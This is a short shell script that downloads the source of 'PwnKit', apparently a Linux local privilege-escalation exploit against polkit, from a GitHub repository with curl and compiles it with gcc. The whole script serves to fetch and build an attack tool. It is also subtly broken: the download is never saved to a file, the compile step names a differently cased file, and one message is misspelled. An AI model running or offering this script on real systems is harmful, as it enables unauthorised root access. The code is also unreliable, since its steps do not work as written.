echo "Fetching C source..."
curl -fsSL https://raw.githubusercontent.com/CCR-ice/pwnkit/main/PwnKit.c
echo "Done."
echo "Creating ecxecutable..."
gcc -o pwnkit pwnkit.c
echo "Done."
